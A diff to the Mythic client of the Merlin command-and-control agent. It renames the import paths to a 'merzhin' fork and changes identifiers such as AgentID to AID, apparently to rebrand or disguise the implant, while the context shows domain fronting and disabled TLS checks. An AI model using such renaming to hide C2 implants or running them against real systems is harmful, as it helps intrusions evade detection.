@@ -51,13 +51,13 @@ import (
 	"golang.org/x/net/http2"
 
 	// Merlin Main
-	"github.com/Ne0nd0g/merlin/pkg/core"
-	"github.com/Ne0nd0g/merlin/pkg/jobs"
-	"github.com/Ne0nd0g/merlin/pkg/messages"
+	"github.com/testtoto1337/merzhin/pkg/core"
+	"github.com/testtoto1337/merzhin/pkg/jobs"
+	"github.com/testtoto1337/merzhin/pkg/messages"
 
 	// Internal
-	"github.com/Ne0nd0g/merlin-agent/cli"
-	"github.com/Ne0nd0g/merlin-agent/clients"
+	"github.com/testtoto1337/merzhin-agent/cli"
+	"github.com/testtoto1337/merzhin-agent/clients"
 )
 
 // Files is global map used to track Mythic's multi-step file transfers. I holds data between requests
@@ -65,8 +65,8 @@ var Files = make(map[string]*jobs.FileTransfer)
 
 // Client is a type of MerlinClient that is used to send and receive Merlin messages from the Merlin server
 type Client struct {
-	clients.MerlinClient
-	AgentID    uuid.UUID         // TODO can this be recovered through reflection since client is embedded into agent?
+	clients.MerzhinClient
+	AID    uuid.UUID         // TODO can this be recovered through reflection since client is embedded into agent?
 	MythicID   uuid.UUID         // The identifier used by the Mythic framework
 	Client     *http.Client      // Client to send messages with
 	Protocol   string            // The HTTP protocol the client will use
@@ -84,7 +84,7 @@ type Client struct {
 
 // Config is a structure that is used to pass in all necessary information to instantiate a new Client
 type Config struct {
-	AgentID   uuid.UUID // The Agent's UUID
+	AID   uuid.UUID // The Agent's UUID
 	PayloadID string    // The UUID used with the Mythic framework
 	Protocol  string    // Proto contains the transportation protocol the agent is using (i.e. http2 or http3)
 	Host      string    // Host is used with the HTTP Host header for Domain Fronting activities
@@ -101,7 +101,7 @@ func New(config Config) (*Client, error) {
 	cli.Message(cli.DEBUG, "Entering into clients.mythic.New()...")
 	cli.Message(cli.DEBUG, fmt.Sprintf("Config: %+v", config))
 	client := Client{
-		AgentID:   config.AgentID,
+		AID:   config.AID,
 		URL:       config.URL,
 		UserAgent: config.UserAgent,
 		Host:      config.Host,
@@ -272,7 +272,7 @@ func (client *Client) Initial(agent messages.AgentInfo) (messages.Base, error) {
 	}
 
 	base := messages.Base{
-		ID:      client.AgentID,
+		ID:      client.AID,
 		Type:    messages.KEYEXCHANGE,
 		Payload: rsaRequest,
 	}
@@ -293,7 +293,7 @@ func (client *Client) Initial(agent messages.AgentInfo) (messages.Base, error) {
 	}
 
 	returnMessage := messages.Base{
-		ID:   client.AgentID,
+		ID:   client.AID,
 		Type: messages.IDLE,
 	}
 	return returnMessage, nil
@@ -343,7 +343,7 @@ func getClient(protocol string, proxyURL string, ja3 string) (*http.Client, erro
 	// Setup TLS configuration
 	TLSConfig := &tls.Config{
 		MinVersion:         tls.VersionTLS12,
-		InsecureSkipVerify: true, // #nosec G402 - see https://github.com/Ne0nd0g/merlin/issues/59 TODO fix this
+		InsecureSkipVerify: true, // #nosec G402 - see https://github.com/testtoto1337/merzhin/issues/59 TODO fix this
 		CipherSuites: []uint16{
 			tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,
 			tls.TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA,
@@ -439,7 +439,7 @@ func (client *Client) convertToMerlinMessage(data []byte) (messages.Base, error)
 	}
 
 	returnMessage := messages.Base{
-		ID: client.AgentID,
+		ID: client.AID,
 	}
 
 	// Logic for processing or converting Mythic messages
@@ -519,7 +519,7 @@ func (client *Client) convertToMerlinMessage(data []byte) (messages.Base, error)
 							TaskID: response.ID,
 							Data:   d.FileBlob,
 						}
-						returnMessage.ID = client.AgentID
+						returnMessage.ID = client.AID
 						returnMessage.Type = DownloadSend
 						returnMessage.Payload = f
 						// This isn't great because now we're in recursive Send, but YOLO
@@ -539,7 +539,7 @@ func (client *Client) convertToMerlinMessage(data []byte) (messages.Base, error)
 				}
 			}
 			if response.Status == "success" && response.ID != "" {
-				return messages.Base{ID: client.AgentID, Token: response.ID, Type: messages.IDLE}, nil
+				return messages.Base{ID: client.AID, Token: response.ID, Type: messages.IDLE}, nil
 			}
 		}
 
@@ -622,7 +622,7 @@ func (client *Client) convertToMythicMessage(m messages.Base) (string, error) {
 					fm.NumChunks = 1
 
 					returnMessage := messages.Base{
-						ID:      client.AgentID,
+						ID:      client.AID,
 						Type:    DownloadInit,
 						Payload: fm,
 					}
@@ -700,7 +700,7 @@ func (client *Client) convertTasksToJobs(tasks []Task) (messages.Base, error) {
 	// Merlin messages.Base structure
 	base := messages.Base{
 		Version: 1,
-		ID:      client.AgentID,
+		ID:      client.AID,
 		Type:    messages.JOBS,
 	}
 
@@ -713,7 +713,7 @@ func (client *Client) convertTasksToJobs(tasks []Task) (messages.Base, error) {
 		if err != nil {
 			return messages.Base{}, fmt.Errorf("there was an error unmarshalling the Mythic task parameters to a mythic.Job:\r\n%s", err)
 		}
-		job.AgentID = client.AgentID
+		job.AID = client.AID
 		job.ID = task.ID
 		job.Token = uuid.FromStringOrNil(task.ID)
 		job.Type = mythicJob.Type
